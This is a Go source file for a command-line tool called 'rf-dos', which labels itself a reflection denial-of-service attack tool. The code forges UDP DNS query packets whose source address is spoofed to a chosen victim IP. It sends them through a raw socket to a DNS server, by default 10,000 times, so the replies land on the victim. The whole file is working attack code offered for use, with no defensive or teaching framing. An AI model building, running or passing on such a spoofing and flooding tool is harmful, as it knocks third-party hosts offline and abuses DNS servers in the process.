package main

import (
	"errors"
	"math/rand"
	"net"
	"os"
	"strconv"
	"syscall"
	"time"

	"github.com/akamensky/argparse"
	"github.com/google/gopacket"
	"github.com/google/gopacket/layers"
	"github.com/rs/zerolog"
	"github.com/rs/zerolog/log"
)

var logger zerolog.Logger

func sendLogger(victim string, victim_port int, dns string, dns_port int, number int) {
	logger.Info().Int("Sent", number).Str(" packets to ", dns).Int("port", dns_port).Str("That got reflected to victim ", victim).Int("Through port", victim_port).Msg("Successfully")
}

func create_packet(victim string, victim_port int, dns string, dns_port int) ([]byte, error) {
	srcIP := net.ParseIP(victim).To4() //Spoofed IP
	dnsIP := net.ParseIP(dns).To4()

	ip := &layers.IPv4{
		SrcIP:    srcIP,
		DstIP:    dnsIP,
		Protocol: layers.IPProtocolUDP,
	}

	udp := &layers.UDP{
		SrcPort: layers.UDPPort(victim_port),
		DstPort: layers.UDPPort(dns_port),
	}

	udp.SetNetworkLayerForChecksum(ip)

	// Minimal DNS query packet (for domain "example.com")
	dnsQuery := []byte{
		0xaa, 0xaa, // ID
		0x01, 0x00, // Standard query
		0x00, 0x01, 0x00, 0x00, // 1 question, 0 answers
		0x00, 0x00, 0x00, 0x00, // 0 authority, 0 additional
		0x07, 'e', 'x', 'a', 'm', 'p', 'l', 'e',
		0x03, 'c', 'o', 'm', 0x00,
		0x00, 0x01, 0x00, 0x01, // Type A, Class IN
	}

	buffer := gopacket.NewSerializeBuffer()
	opts := gopacket.SerializeOptions{ComputeChecksums: true, FixLengths: true}

	err := gopacket.SerializeLayers(buffer, opts,
		ip,
		udp,
		gopacket.Payload(dnsQuery),
	)

	if err != nil {
		logger.Error().Err(err).Msg("Failed to serialize layers")
		return nil, err
	}

	return buffer.Bytes(), nil
}

func send_requests(packet []byte, victim string, victim_port int, dns string, dns_port int, iface string, number int) {
	fd, err := syscall.Socket(syscall.AF_INET, syscall.SOCK_RAW, syscall.IPPROTO_UDP)
	if err != nil {
		logger.Error().Err(err).Msg("Failed to create socket")
		return
	}
	defer syscall.Close(fd)

	err = syscall.BindToDevice(fd, iface)
	if err != nil {
		logger.Error().Err(err).Msg("Failed to bind to device")
		return
	}

	for i := 0; i < number; i++ {
		err = syscall.Sendto(fd, packet, 0, &syscall.SockaddrInet4{
			Port: dns_port,
			Addr: [4]byte(net.ParseIP(dns).To4()),
		})
		if err != nil {
			logger.Error().Err(err).Msg("Failed to send packet")
			return
		}
		time.Sleep(20 * time.Millisecond)
	}
	sendLogger(victim, victim_port, dns, dns_port, number)
}

func main() {
	// logger setup
	zerolog.TimeFieldFormat = zerolog.TimeFormatUnix
	zerolog.SetGlobalLevel(zerolog.InfoLevel)
	logger = log.Output(zerolog.ConsoleWriter{Out: os.Stderr}).With().Timestamp().Logger()

	// argument parser setup
	parser := argparse.NewParser("rf-dos", "Reflection DoS attack tool")

	victim := parser.String("", "victim", &argparse.Options{
		Required: true,
		Help:     "Target Victim",
		Validate: func(args []string) error {
			if len(args[0]) == 0 {
				return errors.New("victim cannot be empty")
			} else {
				ip := net.ParseIP(args[0])
				if ip == nil {
					return errors.New("victim must be a valid IP address")
				}
				if ip.To4() == nil {
					return errors.New("victim must be a valid IPv4 address")
				}
				if ip.IsLoopback() {
					return errors.New("victim cannot be a loopback address")
				}

				if ip.IsUnspecified() {
					return errors.New("victim cannot be an unspecified address")
				}
			}
			return nil
		},
	})

	victim_port := parser.Int("", "victim_port", &argparse.Options{
		Required: false,
		Help:     "Target victim_port must be between 1025 and 65535, default is random",
		Default:  rand.Intn(65535-1025) + 1025,
		Validate: func(args []string) error {
			val, err := strconv.Atoi(args[0])
			if err != nil {
				return errors.New("victim port must be a number")
			}

			if val <= 0 || val >= 65535 {
				return errors.New("victim port must be between 1 and 65535")
			}
			return nil
		},
	})

	dns_server := parser.String("", "dns_server", &argparse.Options{
		Required: true,
		Help:     "Target Dns_server",
		Validate: func(args []string) error {
			if len(args[0]) == 0 {
				return errors.New("dns_server cannot be empty")
			} else {
				ip := net.ParseIP(args[0])
				if ip == nil {
					return errors.New("dns_server must be a valid IP address")
				}
				if ip.To4() == nil {
					return errors.New("dns_server must be a valid IPv4 address")
				}
				if ip.IsLoopback() {
					return errors.New("dns_server cannot be a loopback address")
				}

				if ip.IsUnspecified() {
					return errors.New("dns_server cannot be an unspecified address")
				}
			}
			return nil
		},
	})

	dns_port := parser.Int("", "dns_port", &argparse.Options{
		Required: false,
		Help:     "Target dns_port, default is 5353",
		Default:  5353,
		Validate: func(args []string) error {
			val, err := strconv.Atoi(args[0])
			if err != nil {
				return errors.New("port must be a number")
			}

			if val <= 0 || val >= 65535 {
				return errors.New("port must be between 1 and 65535")
			}
			return nil
		},
	})

	iface := parser.String("i", "interface", &argparse.Options{
		Required: true,
		Help:     "Network interface to use for sending packets",
		Validate: func(args []string) error {
			if len(args[0]) == 0 {
				return errors.New("interface cannot be empty")
			} else {
				iface, err := net.InterfaceByName(args[0])
				if err != nil {
					return errors.New("interface must be a valid network interface")
				}
				if iface.Flags&net.FlagUp == 0 {
					return errors.New("interface must be up")
				}
			}
			return nil
		},
	})

	number := parser.Int("n", "number", &argparse.Options{
		Required: true,
		Help:     "Number of packets to send",
		Default:  10000,
		Validate: func(args []string) error {
			val, err := strconv.Atoi(args[0])
			if err != nil {
				return errors.New("must be a number")
			}

			if val < 0 {
				return errors.New("must be greater than 0")
			}
			return nil
		},
	})

	if err := parser.Parse(os.Args); err != nil {
		logger.Fatal().
			Err(err).
			Msg("Error parsing arguments")
		return
	}

	packet, err := create_packet(*victim, *victim_port, *dns_server, *dns_port)
	if err != nil {
		logger.Error().Err(err).Msg("Failed to create packet")
		return
	}
	send_requests(packet, *victim, *victim_port, *dns_server, *dns_port, *iface, *number)
}
